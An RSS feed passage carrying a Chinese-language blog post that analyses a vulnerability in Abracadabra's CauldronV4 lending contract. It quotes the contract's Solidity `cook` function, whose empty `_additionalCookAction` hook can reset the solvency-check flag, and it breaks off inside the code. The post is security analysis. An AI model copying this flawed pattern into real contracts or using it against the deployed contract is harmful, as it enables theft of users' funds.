<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Byebyedoggy</title>
        <link>https://byebydoggy.github.io/post/</link>
        <description>Recent content in Posts on Byebyedoggy</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 18 Dec 2025 18:22:21 +0800</lastBuildDate><atom:link href="https://byebydoggy.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>1218 Abracadabra(MIM_SPELL) CauldronV4合约漏洞分析</title>
        <link>https://byebydoggy.github.io/post/2025/1218-abracadabramim_spell-cauldronv4%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Thu, 18 Dec 2025 18:22:21 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/1218-abracadabramim_spell-cauldronv4%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 1218 Abracadabra(MIM_SPELL) CauldronV4合约漏洞分析" /&gt;&lt;h1 id=&#34;项目方&#34;&gt;项目方
&lt;/h1&gt;&lt;p&gt;x.com/MIM_Spell&lt;/p&gt;
&lt;h1 id=&#34;漏洞合约&#34;&gt;漏洞合约
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://dev.abracadabra.money/deployment-addresses/ethereum-mainnet&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://dev.abracadabra.money/deployment-addresses/ethereum-mainnet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中Cauldrons V4的stdeusd合约具有漏洞&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_additionalCookAction&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt; action, CookStatus &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; value, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; data, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; value1, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; value2) &lt;span style=&#34;color:#66d9ef&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;virtual&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;returns&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt;, CookStatus &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt;) {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt;[] calldata actions,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;[] calldata values,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt;[] calldata datas
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ) &lt;span style=&#34;color:#66d9ef&#34;&gt;external&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;payable&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;returns&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; value1, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; value2) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CookStatus &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; status;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; actions.length; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; actions[i];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;status.hasAccrued &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                accrue();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                status.hasAccrued &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_ADD_COLLATERAL) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; share, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; to, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; skim) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                addCollateral(to, skim, _num(share, value1, value2));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_REPAY) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; part, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; to, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; skim) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                _repay(to, skim, _num(part, value1, value2));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_REMOVE_COLLATERAL) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; share, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; to) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                _removeCollateral(to, _num(share, value1, value2));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                status.needsSolvencyCheck &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BORROW) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; amount, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; to) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (value1, value2) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _borrow(to, _num(amount, value1, value2));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                status.needsSolvencyCheck &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_UPDATE_EXCHANGE_RATE) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; must_update, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; minRate, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; maxRate) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; updated, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; rate) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; updateExchangeRate();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                require((&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;must_update &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; updated) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; rate &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; minRate &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (maxRate &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; rate &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; maxRate), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cauldron: rate not ok&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BENTO_SETAPPROVAL) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; user, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; _masterContract, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; approved, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt; r, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt; s) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                bentoBox.setMasterContractApproval(user, _masterContract, approved, v, r, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BENTO_DEPOSIT) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (value1, value2) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _bentoDeposit(datas[i], values[i], value1, value2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BENTO_WITHDRAW) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (value1, value2) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _bentoWithdraw(datas[i], value1, value2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BENTO_TRANSFER) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (IERC20 token, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; to, &lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; share) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (IERC20, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                bentoBox.transfer(token, msg.sender, to, _num(share, value1, value2));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_BENTO_TRANSFER_MULTIPLE) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (IERC20 token, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;[] &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; tos, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;[] &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; shares) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (IERC20, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;[], &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;[]));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                bentoBox.transferMultiple(token, msg.sender, tos, shares);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_CALL) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; returnData, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt; returnValues) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _call(values[i], datas[i], value1, value2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (returnValues &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    (value1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(returnData, (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (returnValues &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    (value1, value2) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(returnData, (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_GET_REPAY_SHARE) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; part &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                value1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bentoBox.toShare(magicInternetMoney, totalBorrow.toElastic(_num(part, value1, value2), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_GET_REPAY_PART) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt; amount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(datas[i], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                value1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; totalBorrow.toBase(_num(amount, value1, value2), &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (action &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ACTION_LIQUIDATE) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                _cookActionLiquidate(datas[i]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; returnData, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8&lt;/span&gt; returnValues, CookStatus &lt;span style=&#34;color:#66d9ef&#34;&gt;memory&lt;/span&gt; returnStatus) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _additionalCookAction(action, status, values[i], datas[i], value1, value2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; returnStatus;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (returnValues &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    (value1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(returnData, (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (returnValues &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    (value1, value2) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abi.decode(returnData, (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status.needsSolvencyCheck) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            (, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; _exchangeRate) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; updateExchangeRate();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            require(_isSolvent(msg.sender, _exchangeRate), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cauldron: user insolvent&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
